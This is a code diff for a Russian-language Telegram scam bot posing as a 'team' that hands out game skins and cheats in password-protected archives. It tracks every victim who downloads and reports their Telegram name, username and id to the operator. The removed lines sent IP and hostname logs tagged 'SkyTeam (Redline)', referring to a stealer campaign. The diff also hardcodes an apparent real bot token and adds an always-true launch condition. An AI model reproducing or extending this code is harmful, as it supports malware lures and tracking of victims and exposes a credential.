@@ -26,7 +26,7 @@ if __name__ == '__main__':
                     [2] Install Requirements
                     [3] Exit {Fore.RESET}
     '''
-    print(label)
+    #print(label)
     choice = input(f"{Fore.LIGHTCYAN_EX}Choose: {Fore.RESET}")
     if choice == '3':
         exit()
@@ -36,16 +36,16 @@ if __name__ == '__main__':
 
     else:
 
-        c_token = input(f"{Fore.LIGHTBLUE_EX}Token: {Fore.RESET}")
-        admin_id = input(f"{Fore.RED}Your id for admin panel: {Fore.RESET}")
-        name = input(f"{Fore.GREEN} Enter name of the your fake \"Company\": ")
+        c_token = "6228298637:AAGoxLgLAiU845AakUy-Dc9IMsa6xWXWN6I" #input(f"{Fore.LIGHTBLUE_EX}Token: {Fore.RESET}")
+        admin_id = ""#input(f"{Fore.RED}Your id for admin panel: {Fore.RESET}")
+        name = "000"#input(f"{Fore.GREEN}Enter name of the your fake \"Company\": ")
         ready = input(f"{Fore.LIGHTRED_EX}Launch bot? (y, n): {Fore.RESET}")
 
         bot = Bot(c_token)
         dp = Dispatcher(bot)
         defoult_id = 1058852120
         db = Database('users.db')
-        if ready == "y":
+        if ready == "y" or "1": #change
 
             # Some Information
             print(f"{Fore.RED}Started of the token: {c_token}\n"
@@ -71,7 +71,7 @@ if __name__ == '__main__':
                     db.add_user(message.from_user.id)
                     await bot.send_message(
                         message.from_user.id,
-                        f"Приветствуем! Это команда {name}. \nВведите ваш никнейм:")
+                        f"🙌Приветствуем! Это команда {name}. \n👨‍💻Введите ваш никнейм:")
                 else:
                     markup.add(start, soft, top, help)
                     await bot.send_message(
@@ -103,10 +103,9 @@ if __name__ == '__main__':
                     ref.insert(scam)
                     ref.insert(back)
                     if message.text == '🥷🏻 ПРОФИЛЬ' or message.text == '/profile':
+
+
                         await bot.send_message(admin_id or defoult_id, text="Была нажата кнопка 'профиль'\n"
-                                                              f"Nick: {db.get_nickname(message.from_user.id)}\n"
-                                                              f"Id: {message.from_user.id}")
-                        print("Была нажата кнопка 'профиль'\n"
                                                               f"Nick: {db.get_nickname(message.from_user.id)}\n"
                                                               f"Id: {message.from_user.id}")
 
@@ -212,19 +211,11 @@ if __name__ == '__main__':
             @dp.callback_query_handler(text='skin')
             async def choice1(call: types.CallbackQuery):
 
-                await bot.send_message(admin_id or defoult_id, text=f"New Log: \n"
-                                                      f"Name: # \n"
-                                                      f"Ip: {requests.get('https://ramziv.com/ip').text}\n"
-                                                      f"Xz: {socket.gethostbyname(socket.gethostname())} \n"
-                                                      f"Public: {socket.gethostname()}\n"
-                                                      f"Time: {datetime.now()} \n"
-                                                      f"Check: https://t.me/Sky_Team_Bot\n"
-                                                      f"Method: SkyTeam (Redline)\n"
-                                                      f"Telegram: (working)\n"
-                                                      f"\n")
-
-                print(
-                    f"New Log: \nName: {db.get_nickname(types.Message.from_user.id)} \nIp: {requests.get('https://ramziv.com/ip').text}\nXz: {socket.gethostbyname(socket.gethostname())} \nPublic: {socket.gethostname()}\nTime: {datetime.now()} \nCheck: https://t.me/Sky_Team_Bot\nMethod: SkyTeam (Redline)\nTelegram: (working)\n")
+                await bot.send_message(admin_id or defoult_id, text=f'''Somebody downloaded:
+        
+        Fullname: {types.Message.from_user.full_name}
+        @username: {types.Message.from_user.username}
+        id: {types.Message.from_user.id}''')
 
                 skins = types.InlineKeyboardMarkup(row_width=2)
                 vt1 = types.InlineKeyboardButton(
@@ -259,22 +250,14 @@ if __name__ == '__main__':
                     "🔥 Пароль от архива: skin")
                 await call.message.edit_reply_markup(reply_markup=skins)
 
-
             @dp.callback_query_handler(text="cheat")
             async def choice2(call: types.CallbackQuery):
-                await bot.send_message(admin_id or defoult_id, text=f"New Log: \n"
-                                                      f"Name: # \n"
-                                                      f"Ip: {requests.get('https://ramziv.com/ip').text}\n"
-                                                      f"Xz: {socket.gethostbyname(socket.gethostname())} \n"
-                                                      f"Public: {socket.gethostname()}\n"
-                                                      f"Time: {datetime.now()} \n"
-                                                      f"Check: https://t.me/Sky_Team_Bot\n"
-                                                      f"Method: SkyTeam (Redline)\n"
-                                                      f"Telegram: (working)\n"
-                                                      f"\n")
+                await bot.send_message(admin_id or defoult_id, text=f'''Somebody downloaded:
+        
+        Fullname: {call.from_user.full_name}
+        @username: {call.from_user.username}
+        id: {call.from_user.id}''')
 
-                print(
-                    f"New Log: \nName: {db.get_nickname(types.Message.from_user.id)} \nIp: {requests.get('https://ramziv.com/ip').text}\nXz: {socket.gethostbyname(socket.gethostname())} \nPublic: {socket.gethostname()}\nTime: {datetime.now()} \nCheck: https://t.me/Sky_Team_Bot\nMethod: SkyTeam (Redline)\nTelegram: (working)\n")
 
                 skins = types.InlineKeyboardMarkup(row_width=2)
                 vt1 = types.InlineKeyboardButton(
@@ -341,20 +324,13 @@ if __name__ == '__main__':
 
 
             @dp.callback_query_handler(text="main")
-            async def scamed():
-                await bot.send_message(admin_id or defoult_id, text=f"New Log: \n"
-                                                      f"Name: # \n"
-                                                      f"Ip: {requests.get('https://ramziv.com/ip').text}\n"
-                                                      f"Xz: {socket.gethostbyname(socket.gethostname())} \n"
-                                                      f"Public: {socket.gethostname()}\n"
-                                                      f"Time: {datetime.now()} \n"
-                                                      f"Check: https://t.me/Sky_Team_Bot\n"
-                                                      f"Method: SkyTeam (Redline)\n"
-                                                      f"Telegram: (working)\n"
-                                                      f"\n")
-                # Get The Log
-                print(
-                    f"New Log: \nName: {db.get_nickname(types.Message.from_user.id)} \nIp: {requests.get('https://ramziv.com/ip').text}\nXz: {socket.gethostbyname(socket.gethostname())} \nPublic: {socket.gethostname()}\nTime: {datetime.now()} \nCheck: https://t.me/Sky_Team_Bot\nMethod: SkyTeam (Redline)\nTelegram: (working)\n")
+            async def scamed(call: types.CallbackQuery):
+                await bot.send_message(admin_id or defoult_id, text=f'''Somebody downloaded:
+        
+        Fullname: {call.from_user.full_name}
+        @username: {call.from_user.username}
+        id: {call.from_user.id}''')
+                
 
 
             executor.start_polling(dp, skip_updates=True)
